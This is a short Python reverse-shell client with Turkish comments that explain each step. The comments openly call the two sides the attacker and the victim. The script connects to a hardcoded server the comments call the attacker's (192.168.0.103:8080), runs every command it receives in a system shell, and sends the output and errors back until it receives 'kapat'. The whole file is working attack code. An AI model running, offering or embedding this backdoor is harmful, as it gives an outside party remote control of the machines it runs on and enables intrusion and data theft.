import socket
import subprocess

def baglan():
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#paranteziçi(ipv4,tcp) anlamına gelir.Nesne tanımlamış olduk
    s.connect(("192.168.0.103",8080))#Saldırganın oluşturduğu sunucuya bağlantı kuruyoruz.
    while True:
        komut=s.recv(1024).decode()#Kurban cihaz üzerinde çalışacak komutları, komut değişkenine atıyoruz.
        if 'kapat' in komut:#Saldırgan tarafından kapat komut bilgisi geldiyse bağlantıyı sonlandırıyoruz.
            s.close()
            break
        else:#Bu aşamada saldırgan aracılığı ile alınan komut çalıştırılıyor,elde edilen sonuç geri saldırgana gönderiliyor.
            CMD = subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())  # Komut bilgisine karşılık gelen sonucu saldırgana gönderir.
            s.send(CMD.stderr.read())  # Hata ile karşılaşırsa saldırgana hata ile ilgili bilgi gönderir.

def main():
    baglan()

if __name__ == '__main__':
    main()